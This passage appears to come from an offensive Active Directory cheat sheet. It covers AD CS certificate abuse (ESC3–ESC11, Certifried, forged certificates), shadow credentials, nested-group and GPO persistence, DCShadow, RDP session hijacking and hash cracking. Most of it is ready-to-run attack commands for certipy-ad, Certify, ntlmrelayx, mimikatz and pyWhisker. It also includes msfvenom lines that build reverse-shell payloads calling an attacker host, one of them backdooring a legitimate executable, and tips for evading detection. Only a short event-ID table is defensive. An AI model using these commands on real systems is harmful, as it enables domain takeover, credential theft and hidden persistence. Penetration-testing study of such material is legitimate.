**The attack**: request an enrollment agent certificate (CONDITION1) → use the enrollment agent certificate to issue a certificate request on behalf of another to a template that allow for domain authentication (CONDITION2) → use the resulting certificate to request a TGT.

**Note**: a certificate vulnerable to **ESC2** is also suitable for **CONDITION1** if it's enabled as enrollment agent!

Check for enrollment agent restrictions on the CA from GUI (**CONDITION2** - **REQ6**):

~~~gui
certsrc.msc snap-in → right clicking on the → clicking Properties → navigating to the “Enrollment Agents” tab
~~~

Request an enrollment agent certificate (**CONDITION1**):

~~~shell
Certify.exe request /ca:<domain>\<CA> /template:<Enrollment Agent Template name>
~~~

Use the enrollment agent certificate to issue a certificate request on behalf of another to a template that allow for domain authentication (**CONDITION2**):

~~~shell
Certify.exe request /ca:<domain>\<CA> /template:<Vulnerable Template name (eg. User)> /onbehalfof:<target user domain>/<target username> /enrollcert:<CONDITION1 pfx certificate> /enrollcertpw:<CONDITION1 pfx certificate password>
~~~

Request a certificate (for **CONDITION1**) with `certipy-ad`:

~~~shell
certipy-ad req -u <username> -p <password> -ca <ca name> -target <ca server> -template <vulnerable ESC3-CONDITION1 template>
~~~

Request certificate on behalf of another user with `certipy-ad`:

~~~shell
certipy-ad req -u <username> -p <password> -ca <ca name> -target <ca server> -template <vulnerable ESC3-CONDITION2 template> -pfx <CONDITION1 .pfx certificate> -on-behalf-of '<domain>\<user to impersonate>'
~~~

#### Vulnerable Certificate Template Access Control - ESC4

A certificate template is misconfigured at the access control level if it has ACEs that allow unintended, or otherwise unprivileged, AD principals to edit sensitive security settings in the template.

**Requirements**:

- **REQ1**: a low privileged user has **Full Control** or **Write** permissions on the certificate template object.

**The attack**: edit the certificate template object to enable other attacks such as **ESC1**.

Enumerate certificate templates ACLs with [PSPKI](https://github.com/PKISolutions/PSPKI):

~~~powershell
Get-CertificateTemplateAcl
~~~

Enumerate certificate templates ACLs with `Certify`:

~~~shell
Certify.exe find
~~~

Abuse misconfigured ACLs by making a certificate template vulnerable to other escalation techniques with `certipy-ad`:

~~~shell
certipy-ad template -dc-ip <DC ip> -username <username> -password <password> -template <vulnerable template> -save-old
~~~

**Note**: `-save-old` generates a .json file containing the original configuration for the target template.

Restore certificate to its original configuration:

~~~shell
certipy-ad template -dc-ip <DC ip> -username <username> -password <password> -template <vulnerable template> -configuration <original configuration .json>
~~~

#### Vulnerable PKI Object Access Control - ESC5

**Requirements:**

- **REQ1**: a low privileged user has control on the **CA server’s AD computer object** or **the CA server’s RPC/DCOM server** or ny descendant AD object or container in the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM>` (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services Container, etc.)

**The attack**: an attacker with these privileges can compromise the PKI system and perform any other attack on the certificate services.

#### EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

**Requirements**:
- **REQ1**: If `EDITF_ATTRIBUTESUBJECTALTNAME2` is set on the CA, any request can have user defined values in the subject alternative name. 

**The attack**: This means that an attacker can enroll in ANY template configured for domain authentication (eg. the default **User** template) and obtain a certificate that allows authenticating as any other user.

**Note**: this attack is not working anymore since May 2022 due the patch for **CVE-2022–26923**.

Check if **EDITF_ATTRIBUTESUBJECTALTNAME2** (**ESC6**) is enabled:

~~~shell
certutil -config "<CA_HOST>\<CA_NAME>" -getreg "policy\EditFlags"

# or with remote registry query
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configu
ration<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags

# or with Certify
Certify.exe find
~~~

Enable/disable the `EDITF_ATTRIBUTESUBJECTALTNAME2` with certutil:

~~~shell
# Enable
certutil -config "<CA_HOST>\<CA_NAME>" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

# Disable
certutil -config "<CA_HOST>\<CA_NAME>" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
~~~

Request a certificate with `certipy-ad`:

~~~shell
certipy-ad req -u <username> -p <password> -ca <ca name> -target <ca server> -template <vulnerable template> -upn <user to impersonate>@<domain>
~~~

#### Vulnerable Certificate Authority Access Control - ESC7

**Requirements**:

- **REQ1**: a user with **ManageCA** rights on the certificate authority object.
	-  `certsrv.msc → right clicking a CA → selecting properties → switch to the Security tab`
- \[Optional] **REQ2**: a user with **ManageCertificates** right on the certificate authority object.
	-  `certsrv.msc → right clicking a CA → selecting properties → switch to the Security tab`

**The attack**: when **REQ1** is satisfied, the user can enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag i.e. enable the **ESC6**. Moreover, when the **REQ2** is satisfied, the user has the ability to remotely approve pending certificate requests; this allows an attacker to **subvert the "CA certificate manager approval" protection**.
Moreover, a user with `Manage CA` access right, can grant itself the `Manage Certificates` access right.

Check if a user as `ManageCA` and `ManageCertificates` privileges from gui (`mmc.exe`)(REQ1-2):

~~~gui
certsrv.msc → right clicking a CA → selecting properties → switch to the Security tab
~~~

Check if a user as `ManageCA` and `ManageCertificates` privileges with `PSPKI`:

~~~powershell
Get-CertificationAuthority -ComputerName <CA hostname> | Get-CertificationAuthorityAcl | select -expand Access
~~~

Remotely enable `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (bitmask `262144`) for a CA with `PSPKI`:

~~~powershell
Import-Module PSPKI
$ConfigReader = new-object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "<CA FQDN>"
$ConfigReader.SetRootNode($true)
$res = $ConfigReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$ConfigReader.SetConfigEntry($res + 262144,"EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
~~~

Remotely approve certificate requests with `PSPKI`:

~~~powershell
Get-CertificationAuthority -ComputerName <CA hostname> | Get-PendingRequest -RequestID <request id> | Approve-CertificateRequest
~~~

Download certificate with `Certify`:

~~~shell
Certify.exe download /ca:<domain>\<CA> /id:<certificate request id>
~~~

Add `Manage Certificates` grant to a user with `certipy-ad` (requires `Manage CA` rights):

~~~shell
certipy-ad ca -ca <ca name> -target <target ca server> -add-officer <target username - generally himself> -username <username>@<domain> -password <password>
~~~

Enable a template with `certipy-ad` (requires `Manage CA` rights):

~~~shell
certipy-ad ca -ca <ca name> -target <target ca server> -enable-template <template name> -username <username>@<domain> -password <password>
~~~

Approve a certificate request with `certipy-ad` (requires `Manage CA` rights):

~~~shell
certipy-ad ca -ca <ca name> -target <target ca server> -issue-request <request id> -username <username>@<domain> -password <password>
~~~

Retrieve a certificate by request id with `certipy-ad`:

~~~shell
certipy-ad ca -ca <ca name> -target <target ca server> -retrieve <request id> -username <username>@<domain> -password <password>
~~~

#### NTLM Relay to AD CS HTTP Endpoints – ESC8

AD CS supports several HTTP-based enrollment methods via additional AD CS server roles that administrators can install. Using NTLM relay, an attacker could access these web interfaces and request a client authentication certificate based on the User or Machine certificate templates.

This is possible since these endpoints do not have any NTLM relay protections enabled:

- The web enrollment interface (`http://<caserver>/certsrv/`) supports only HTTP and allows only NTLM HTTP Authentication via `Authorization` HTTP header.
- Even though they support negotiate authentication potentially allowing more secure authentication methods, the **Certificate Enrollment Service (CES)**, **Certificate Enrollment Policy (CEP) Web Service**, and **Network Device Enrollment Service (NDES)** are still vulnerable since an attacker can negotiate down to NTLM authentication. 
	- It's possible to prevent NTLM relay attacks on these by coupling HTTP with channel binding but AD CS does not enable **EPA**.
- It's possible to use common [[active-directory-cheatsheet#Coerced Authentications|Coreced Authentications]] methods to request a certificate from a template with **domain computer enrollment** and **client authentication** such as the default **Machine** template to compromised **any computer** coerced.

Enumerate enabled HTTP AD CS endpoints with `Certify`:

~~~shell
Certify.exe cas
~~~

Enumerate CES endpoints with `PSPKI`:

~~~powershell
Get-CertificationAuthority | Select Name, Enroll* | fl *
~~~

Perform a relay attack with `certipy-ad`:

~~~shell
# Targeting HTTP AD CS Endpoints
certipy relay -target 'http://<ca server>' -template <template for the request>

# Targeting RDP AD CS Endpoints
certipy relay -target 'rpc://<ca server>' -template <template for the request>
~~~

**Note**: by default, certipy will use the `User` or `Machine` templates if `-template` is not specified; if relaying a DC machine account NTLM, use the template `DomainController`. When relaying a non-DC machine account use the `Machine` template.

Perform a relay attack with Impacket's `ntlmrelayx`:

~~~shell
impacket-ntlmrelayx -t 'http://<target ca server>/certsrv/certfnsh.asp' --adcs --template <template to use> -l <target dump directory>
~~~

#### Certificate Mapping 

**Certificate mapping** involves associating issued certificates with their respective
subjects:

- When a user requests a certificate, the mapping will associate the issued certificate to that specific user.

Mapping a certificate to an object can be:

- **Explicit**: the `altSecurityIdentities` attribute of the account must contains the identifier of the certificate. This way, for authentication the certificate must be signed by a trusted CA and match the `altSecurityIdentities` value.
- **Implicit**:  the information contained in the certificate's `SAN` is used to match with the DNS (`dnsHostName`) for machine accounts or the UPN (`userPrincipalName`) for user accounts.

Explicit and Implicit mapping can be:

- **Weak**: The mapping is based on certificate attribute without requiring a direct link in AD.
- **Strong**: Strong mapping enforces a strict one-to-one relationship between a certificate and an AD user account.

To overcome the map issue discovered with [[active-directory-cheatsheet#CVE-2022–26923 - Certifried|CVE-2022–26923 (Certifried)]]], Microsoft introduced a new security extension `szOID_NTDS_CA_SECURITY_EXT` for certificates:

- Contains the  `objectSid` of the requester

Moreover, two new registry keys have been introduced to properly deal with certificate mapping:

- `StrongCertificateBindingEnforcement`:  used for *Kerberos* mapping.
- `CertificateMappingMethods` used for *Schannel* implicit mapping.

`StrongCertificateBindingEnforcement` can be:

- `0`: the  `szOID_NTDS_CA_SECURITY_EXT` extension is not checked, all explicit mappings are allowed. Since 11/04/2024, indicating `0` is now equivalent to indicating `1`.
- `1`: default after the CVE-2022-26923 patch. Authentication is allowed when explicit mapping is present. In the case of **weak implicit mapping**, authentication is allowed if the certificate does not contain a SID in the `szOID_NTDS_CA_SECURITY_EXT` and the account predates the certificate (i.e. the user account in AD existed before the certificate was issued). This mode is also referred as "Compatibility Mode" and it's no more supported since 11/02/2025.
- `2`: **Only strong mapping is allowed** for authentication. In case of implicit authentication, `szOID_NTDS_CA_SECURITY_EXT` must be present and contain a object's SID. In case of explicit mapping, only strong types are allowed.

When `StrongCertificateBindingEnforcement` is `0` and the certificate contains a UPN, the map flow is the following:

1. The KDC first attempts to map the certificate to a user with a matching `userPrincipalName`.
2. If no match are found, the KDC tries then to map the certificate to a user with a matching `sAMAccountName`.
3. If still no match, the KDC tries matching a username appending a "$". In that case, a UPN will be mapped to a machine account.

When `StrongCertificateBindingEnforcement` is `0` and the certificate contains a DNS value, the map flow is the following (the same abused in Certifried):

1. The KDC splits the username into two parts: *user* and *domain*.  `user.domain.local` becomes `user` and `domain.local`. 
2. The domain part is validate against AD domain (must be a valid domain).
3. The user part is validated by adding a "$" and searching for an account with a corresponding `sAMAccountName`.

If the registry key value is 1\* or 2, the `szOID_NTDS_CA_SECURITY_EXT` security extension will
be used to map the account using its objectSid.

\*Note: `szOID_NTDS_CA_SECURITY_EXT` is present and valued with a SID.

##### CVE-2022–26923 - Certifried

Reference: [CVE-2022-26923 - Certifried Explained](https://www.hackthebox.com/blog/cve-2022-26923-certifried-explained#vulnerability_description).

This vulnerability abuses AD CS to request machine certificates with arbitrary attacker-controlled DNS host names.

- This allows any computer account in the domain to impersonate the Domain Controller, resulting in a complete domain takeover. 

Since machine accounts are not associated with a **UPN**, the flag `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` is not applicable:

- The DNS host name attribute (`dNSHostName`) is used instead on Machine certificates, as indicated by the `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` flag. 

By default, the creator of a machine account has the **Validated write to DNS host name** permission on this account; this means that a user with this permission can set the `dNSHostName` to any value (any valid computer name in the domain), for example, setting the same hostname as a Domain Controller.

- This is true only when removing all SPNs that contains the value from `dNSHostName`; this is necessary due the fact that SPNs are validated whilst **dNSHostName** itself is not.

When a certificate is used for authentication, PKINIT will **weakly map** the request to the Domain Controller account as follows, effectively resulting in authentication as the DC machine account:

1. The principal name of the target account (e.g. computer01$@htb.local) is supplied, together with a certificate containing a matching DNS host name computer01@htb.local (without the $ sign at the end).
2. The KDC looks up the machine account from the given principal name, obtaining the corresponding `sAMAccountName` (computer01$).
3. Having obtained the target `sAMAccountName`, the KDC then splits the DNS host name from the certificate into two parts: computer name (computer01) and realm (htb.local).
4. If the computer name part (computer01) matches the `sAMAccountName` (computer01$) and the realm part (htb.local) matches the DNS domain name of the realm, mapping is successful. Otherwise, the KDC should return the KDC_ERR_CLIENT_NAME_MISMATCH error.

Create a machine account with `certipy-ad`:

~~~shell
certipy-ad account create -u username@domain -p password -user '<machine account name>$' -dns <dNSHostName - target DC host name> [-dc-ip <DC IP>]
~~~

Request a certificate for the created machine account with the `Machine` template with `certipy-ad`:

~~~shell
certipy-ad req -u username@domain -p password -ca <CA Name> -template Machine
~~~

Authenticate to the DC using the resulting certificate with `certipy-ad`:

~~~shell
certipy-ad auth -pfx dc.pfx -dc-ip <DC IP>
~~~

Remove machine account (requires elevated privileges):

~~~shell
certipy-ad account delete -u <username>@<domain> -p <password> -user '<machine account name>$'
~~~

Interesting Tools:

- [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit)
##### No Security Extension - ESC9

When the `msPKI-Enrollment-Flag` attribute of a certificate template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag, it effectively negates the embedding of the `szOID_NTDS_CA_SECURITY_EXT` security extension when `StrongCertificateBindingEnforcement` is not set to `2`. 

- the mapping process will occur as if `StrongCertificateBindingEnforcement` has a value of `0`, essentially bypassing strong certificate mapping and using UPN or DNS values.

Requirements:

- **REQ1**: `StrongCertificateBindingEnforcement` should not be set to `2` or `CertificateMappingMethods` is set to `0x4`. This requirement cannot be checked with low-privileged users since typically it would not have enough privileges to read those registry keys.
- **REQ2**: the `msPKI-Enrollment-Flag` attribute of a certificate template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag
- **REQ3**: the certificate template should allow client authentication.
- **REQ4**: `GenericWrite` (or higher) privileges are required to alter the UPN of the account that can enroll this certificate template.

**The attack**: having enough write privileges on an account that can enroll a vulnerable template, an attacker could modify its UPN and set it to the value of an Administrator UPN. Then the attacker could simply request the certificate with the modified UPN account (its credentials/hashes are therefore needed).

Update user UPN with `certipy-ad`:

~~~shell
certipy account update -username "<owned user>@<domain>" -p "<password>" -user <target user> -upn <Administrator UPN>
~~~

**Note**: Use the same command to restore the old value.

Request then the certificate using *target user* credentials with`certipy-ad`:

~~~shell
certipy-ad req -u <username> -p <password> -ca <ca name> -target <ca server> -template <vulnerable ESC9 template or 'User' for ESC10>
~~~

##### Weak certificate mapping - ESC10

The ESC10 abuse case is similar to the previous ESC9 but focuses on misconfigurations in
registry keys rather than template configurations. There are two cases where this misconfiguration can be exploited.

- **CASE1 - Kerberos Authentication**: `StrongCertificateBindingEnforcement` is set to `0` (no more exploitable since April 2023 patch).
- **CASE2 - Schannel Authentication**: `CertificateMappingMethods` is set to `0x4`.

**CASE1** Requirements:

- **REQ1**: `StrongCertificateBindingEnforcement` is set to `0` 
- **REQ2**: The template allows client authentication.
- **REQ3**: `GenericWrite` (or higher) privileges are required to alter the UPN of the account that can enroll this certificate template.

**The attack**: same as for **ESC9**.

**CASE2** Requirements:

- **REQ1**: `CertificateMappingMethods` is set to `0x4`.
- **REQ2**: The template allows client authentication.
- **REQ3**: `GenericWrite` (or higher) privileges are required to set the UPN of the account that can enroll this certificate template **that must not have an UPN set** (otherwise, constraint violation errors are raised).

**The attack**: same as for **ESC9**.

#### NTLM Relay to AD CS RDP Endpoints – ESC11

By default, ADCS exposes an RPC endpoint for certificate enrollment called the **MS-ICPR**
**RPC** interface. 

- The RPC protocol allows each interface to define its NTLM signature management policy. In the case of the MS-ICPR interface, the setting of the `IF_ENFORCEENCRYPTICERTREQUEST` flag determines whether the signature check is enabled.

**The attack**: When the certificate authority is not configured with `IF_ENFORCEENCRYPTICERTREQUEST`,  the RPC service vulnerable to NTLM relay attacks without signing, such as via SMB.

It's possible to use common [[active-directory-cheatsheet#Coerced Authentications|Coreced Authentications]] methods to request a certificate from a template with **domain computer enrollment** and **client authentication** such as the default **Machine** template to compromised **any computer** coerced.

#### Forging Certificates with Stolen CA Certificates - DPERSIST1 (Golden Certificate)

TODO

Convert `.pem` to `.pfx` with `openssl`:

~~~shell
openssl pkcs12 -in <.pem certificate file path> -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <output .pfx certificate file path>
~~~

Use the private key to forge a new certificate impersonating Administrator with [ForgeCert](https://github.com/GhostPack/ForgeCert):

~~~shell
ForgeCert.exe --CaCertPath <pfx path> --CaCertPassword <pfx password> --Subject CN=User --SubjectAltName <user to impersonate>@<domain> --NewCertPath <pfx output path> --NewCertPassword <output pfx password>
~~~
#### Trusting Rogue CA Certificates - DPERSIST2

TODO

#### Malicious Misconfiguration - DPERSIST3

TODO

#### Shadow Credential

When an account has pre-authentication enabled, this will be validated the moment a TGS is requested. The validation can be *symmetric* (with a DES, RC4, AES128 or AES256 key) or *asymmetric* (with certificates). 

- **Asymmetric Validation (PKINIT)**: The client has a public-private key pair, and encrypts the pre-authentication data with their private key, and the KDC decrypts it with the client’s public key. The KDC also has a public-private key pair, allowing for the exchange of a session key.
	- Public keys are stored in the `msDS-KeyCredentialLink` attribute.

**The attack**: abusing a user that has enough privileges to edit `msDS-KeyCredentialLink`,  an attacker would be able to create a key pair, append to raw public key in the attribute, and obtain persistent and stealthy access to the target object that can be a user or a computer as well.

1. Create an RSA key pair
2. Create an X509 certificate configured with the public key
3. create a **KeyCredential** structure featuring the raw public key and add it to the `msDs-KeyCredentialLink` attribute
4. authenticate using PKINIT and the certificate and private key

**Note**: User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can only if a **KeyCredential** is not set already. **This could be abused combining NTLM relay and shadow credential on the same computer to create a backdoor**.

**Requirements**:

- **REQ1**: the domain must support PKINIT and contain at least one Domain Controller running Windows Server 2016 or above.
- **REQ2**: the Domain Controller must have its own key pair. This is generally true when AD CS is enabled.
- **REQ3**: an account that can edit the target object's `msDS-KeyCredentialLink` attribute.


Enumerate current *KeyCredentials* with `certipy-ad`:

~~~shell
certipy-ad shadow list -username <username>@<domain> -p <password> -account <target account>
~~~

Enumerate current *KeyCredentials* with [pyWhisker](https://github.com/ShutdownRepo/pywhisker):

~~~shell
pywhisker.py -d "<domain>" -u "<username>" -p "<password>" --target "<target object's samname>" --action "list"
~~~

Automatically create a certificate and add it to the target's `msDS-KeyCredentialLink` with `certipy-ad`:

~~~shell
certipy-ad shadow add -username <username>@<domain> -p <password> -account <target account>
~~~

Manually create a self-signed x509 certificate and generate the pfx:

~~~shell
openssl req -newkey rsa:2048 -nodes -keyout private.key -x509 -days 365 -out certificate.cer

openssl pkcs12 -inkey private.key -in certificate.cer -export -out certificate.pfx
~~~

Add a new public key to target's `msDS-KeyCredentialLink` with `pyWhisker`:

~~~shell
# PFX format
pywhisker.py -d "<domain>" -u "<username>" -p "<password>" --target "<target object's samname>" --action "add" --filename "<.pfx path>"

# PEM format
pywhisker.py -d "<domain>" -u "<username>" -p "<password>" --target "<target object's samname>" --action "add" --filename "<.pem path>" --export PEM
~~~

**Note**: if providing a `.pfx` without a password, `pyWhisker` will encrypt it with a new randomly generated password (if not provided with the `-P` parameter). Take note of this password.

Use `certipy-ad` to authenticate with the `.pfx`; since `certipy-ad` does not support encrypted `.pfx`, first decrypt `.pfx` and then use it to authenticate:

~~~shell
# Decrypt - not necessary if the KeyCredential was added with "certipy-ad shadow add"
certipy-ad cert -pfx <encrypted .pfx path> -password "<.pfx password>" -export -out <output filepath>

# Authenticate
certipy-ad auth -pfx <decrypted .pfx> -dc-ip <DC ip> -username <username> -domain <domain>
~~~

Cleanup the attribute with `certipy-ad`:

~~~shell
# Cleanut the whole attribute
certipy-ad shadow clear -username <username>@<domain> -p <password> -account <target account>

# Remove a specific entry
certipy-ad shadow remove -username <username>@<domain> -p <password> -account <target account> --device-id <entry id>
~~~

Cleanup the attribute with `pyWhisker`:

~~~shell
# Cleanup the whole attribute
pywhisker.py -d "<domain>" -u "<username>" -p "<password>" --target "<target object's samname>" --action "clear"

# Remove a specific entry
pywhisker.py -d "<domain>" -u "<username>" -p "<password>" --target "<target object's samname>" --action "remove" --device-id "<entry id>"
~~~

Perform all previous operation with a all-in-one command with `certipy-ad`:

~~~shell
certipy-ad shadow auto -username <username>@<domain> -p <password> -account <target account>
~~~

Perform a shadow credential relay attack with Impacket's `ntlmrelayx`:

~~~shell
ntlmrelayx -t ldap://<target dc> --shadow-credentials --shadow-target '<target object samname>'
~~~

If getting `"self.client.entries[0] index out of range"` error, try skip privilege enumeration with `--no-validate-privs`.

To perform these operations from Windows, use [Whisker](https://github.com/eladshamir/Whisker).

### Group Nesting

 **Group Nesting** is used to create a more organised structure in AD by mean of **recursive groups**. A recursive group is a group that is a member of another group. 

Each nested groups inherits the privileges associated to the parent groups and adds more granular permissions and privileges to their subgroups.

- From the monitoring perspective, deep levels of nesting are harder to monitor.
- From the attacking perspective, leveraging this reduced visibility to perform persistence can help avoid detection.

Create a new group under an Organizational Unit:

~~~powershell
New-ADGroup -Path "<Parent OU DN>" -Name "New Group name" -SamAccountName "new_group_name" -DisplayName "New Group Name" -GroupScope Global -GroupCategory Security
~~~

where:

- `<Parent OU DN>`: is the Distinguished Name of the parent OU (eg: `OU=Parent1,OU=Parent2, DC=<domain_component>,DC=<domain_component>?`)

Add a user or a group as a member of another group:

~~~powershell
Add-ADGroupMember -Identity "<parent_group_samaccountname>" -Members "<group_to_add_samaccountname>"
~~~

Repeat the previous two command multiple time until the required level of nesting is reached. Then add the last group to the "Domain Admins" group and the compromised user to the last group.

Add a user or a group as member of another group using [bloodyAD](https://github.com/CravateRouge/bloodyAD):

~~~shell
bloodyAD --host "<DC ip>" -d "<domain>" -u "<controlled user>" -p "<password|hashes>" add groupMember "<target group>" "<user|group to add>"
~~~

Remove a user or a group as member from another group using [bloodyAD](https://github.com/CravateRouge/bloodyAD):

~~~shell
bloodyAD --host "<DC ip>" -d "<domain>" -u "<controlled user>" -p "<password|hashes>" remove groupMember "<target group>" "<user|group to add>"
~~~

### GPO Persistence

In MMC:

1. Click **File** -> **Add/Remove Snap-in**
2. Select and Add **Group Policy Management**
3. Right-click on **Group Policy Management** and select **Add Forest**
4. Enter the target domain and Click **OK**
5. Find the policy of interest
6. Right-click on **Edit**
7. Perform changes to the policy
8. Right-click on your policy and select Enforced\*

\*Note: This ensures that the policy is applied even though there's a conflict with another policy. Moreover, this ensures that the GPO takes precedence to other policies (for example, defense policies  which could block or remove the changes of the attacker GPO).

The GPO can be used to run a script whenever a user logs in, to grant privileges to particular users or group, to disable some security features, etc.

### DCShadow

This technique consists into temporarily registering a new DC in the target domain; this DC will then be used to alter the Active Directory environment, for example, by changing attributes such as **SIDHistory**, **primaryGroupID** and **SPN** on specified objects, like users or the **AdminSDHolder**, in order to achieve privilege escalation or creating backdoor.

- It's generally hard to detect these changes to the AD environment via event logs since they come from a DC and thus not logged.

By default, Domain Admin privileges are required in order to push **DCShadow**'s changes. 

- Alternatively, by setting particular permissions (modifying ACLs) for a less privileged user, it's possible to do the same without having Domain Admin privileges:

| Permission                     | Object                                                         | Purpose                      |
| ------------------------------ | -------------------------------------------------------------- | ---------------------------- |
| DS-Install-Replica             | Domain                                                         | Add/Remove Replica in Domain |
| DS-Replication-Manage-Topology | Domain                                                         | Manage Replication Topology  |
| DS-Replication-Synchronize     | Domain                                                         | Replication Synchornization  |
| CreateChild                    | Sites object (and its children) in the Configuration container | Create child object          |
| DeleteChild                    | Sites object (and its children) in the Configuration container | Delete child object          |
| WriteProperty                  | Computer object registered as DC                               | Edit properties              |
| WriteProperty                  | Target Object                                                  | Edit properties              |

Anyway, setting these permissions involves the generation of change logs since these changes are not coming from a DC:

- An interesting strategy would be to use **DCShadow** to set this permissions in order to avoid logs generation  (Domain admin privileges or equivalent will then be necessary). This can be done by setting the correct ACEs in the `ntSecurityDescriptor` attribute on the objects listed in the previous table.

Start a RPC server with SYSTEM privileges and setup changes to a object with `mimikatz`:

~~~shell
!+
!processtoken

# Single change
lsadump::dcshadow /object:<object distinguished name> /attribute:<attribute name> /value=<attribute value>

# Multiple changes need the /stack option
lsadump::dcshadow /stack /object:<object 1 distinguished name> /attribute:<attribute name> /value=<attribute value>
...
lsadump::dcshadow /stack /object:<object N distinguished name> /attribute:<attribute name> /value=<attribute value>

lsadump::dcshadow
~~~

Note: Changed attribute are generally `SIDHistory` or `primaryGroupID`, used to elevate a user privileges.

Edit the AdminSDHolder object:

~~~powershell
# Get current ACEs for the AdminSDHolder object
(New-Object
System.DirectoryServices.DirectoryEntry("<CN=AdminSDHolder,CN=System,DC=<domain_component>,DC=<domain_component>?>")).psbase.ObjectSecurity.sddl
~~~

~~~shell
!+
!processtoken
lsadump::dcshadow
/object:'<CN=AdminSDHolder,CN=System,DC=<domain_component>,DC=<domain_component>?>' /attribute:ntSecurityDescriptor /value:<modified ACL>
~~~

Note: **previous command can be used to edit ACLs for any object!**

Push changes through AD; run the following command with enough privileges (Domain admin or otherwise):

~~~shell
privilege::debug
lsadump::dcshadow /push
~~~

Use [Set-DCShadowPermissions](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to setup ACLs for a less privileged user in order to push DCShadows changes without a Domain Admin:

~~~powershell
Set-DCShadowPermissions -FakeDC <computer from which running DCShadow> -Object <target object name> -Username <user getting privileges> -Verbose
~~~

Cleanup permissions:

~~~powershell
Set-DCShadowPermissions -FakeDC <computer from which running DCShadow> -Object <target object name> -Username <user getting privileges> -Verbose -Remove
~~~

Note: **this script DOES generate logs!** 

### Backdoors

Inject a backdoor into a legitimate `exe`:

~~~shell
msfvenom -a x64 --platform windows -x <exe file path> -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o <output exe file path>
~~~

Create an exe to be used in a service with msfvenom:

~~~shell
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<attacker ip> LPORT=4444 -o <output exe file path>
~~~

Note: service executables are different from standard .exe files; non-service executables get killed by the service manager almost immediately.

**RDP hijacking**: When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely.
	- Having `SYSTEM` privileges on a **Windows Server 2016 or earlier,** allows an attacker to take over any existing RDP session without requiring a password.
	- From Windows Server 2019 and upward, it's not possible to connect to another user's session without its password.
	- Note that taking over **active** sessions disconnects the legitimate users, enhancing the possibility to be detected.

~~~shell
# If current user is not nt authority\system, open a shell as Administrator
PsExec64.exe -s cmd.exe

# List current active sessions: look for sessions in Disc state (sessions currently opened but not used)
query user
query sessions

# Connect to a session
tscon.exe <session id or session anme> /dest:<current session name or "console">

# Clear session
logoff <session id or session name>
~~~

## Evasion

TODO
https://www.reddit.com/r/HowToHack/comments/16pxfl4/comment/k220pl8/?context=3
https://github.com/anonymous300502/Nuke-AMSI

## Monitoring

Interesting Windows Events to monitor:

| ID   | Description                                                                                                    | Attacks                      |
| ---- | -------------------------------------------------------------------------------------------------------------- | ---------------------------- |
| 4624 | Account Logon                                                                                                  | Golden Ticket, Silver Ticket |
| 4672 | Admin Logon                                                                                                    | Golden Ticket, Silver Ticket |
| 4634 | Account Logoff                                                                                                 | Silver Ticket                |
| 7045 | New Service Installed                                                                                          | Skeleton Key                 |
| 4673 | Sensitive privileges used (eg., **SeSystemtimePrivilege**, **SeCreateGlobalPrivilege**, or **SeTcbPrivilege**) | Skeleton Key                 |
| 4611 | A trusted logon process has been registered with the Local Security Authority                                  | Skeleton Key                 |
| 4657 | Changes to HKLM:\System\CurrentControlSet\Control\Lsa\ DsrmAdminLogonBehavior                                  | DSRM                         |
| 4657 | Changes to HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages                                         | SSP attacks                  |
| 4769 | A Kerberos ticket was requested                                                                                | Kerberoasting                |
| 4662 | An operation was performed on an object                                                                        | ACL Attacks                  |
| 5136 | A directory service object was modified                                                                        | ACL Attacks                  |
| 4670 | Permissions on an object were changed                                                                          | ACL Attacks                  |


## Misc

Mount local folder as network share using `xfreerdp`:

~~~shell
xfreerdp3 /v:<target ip> /u:<domain>\\<user> /p:<password> /drive:<Local folder>,<RDP Network Share>
~~~

### Cracking


Enable logging on `mimikatz` (useful for long e continuous outputs):

~~~shell
# Set the log file for the next command
log <log file path>
<mimikatz command>
~~~

Force computer policy sync with DC:

~~~powershell
gpupdate /force
~~~

Crack NTLM hash with `hashcat`:

~~~shell
hashcat -m 1000 <hashes file> <wordlist>
~~~

Crack NetNTLMv2 hash with `hashcat`:

~~~shell
hashcat -m 5600 <hashes file> <wordlist>
~~~

Crack Net-NTLMv1 challenges and response with `john`:

~~~shell
# hash with format username:client:lmhash:nthash:challenge
john --format=netntlm hash.txt [--wordlist=/path/to/wordlist.txt]
~~~


Manually Import the Active Directory PowerShell module (copy it from a Windows Server instance having the module installed):

~~~powershell
Import-Module Microsoft.ActiveDirectory.Management.dll
Import-Module ActiveDirectory.psd1
~~~

where:

- **Microsoft.ActiveDirectory.Management.dll**: generally located at `C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management`
- **ActiveDirectory.psd1**: generally located at `C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory`

Execute DLL (useful for testing purposes):

~~~shell
rundll32.exe <dll path>,<dll entry point>
~~~

Get Windows Event object:

~~~powershell
Get-WinEvent -FilterHashtable @{Logname=<event type>,ID=<event ID>} -MaxEvents 1 | Format-List -Property *
~~~

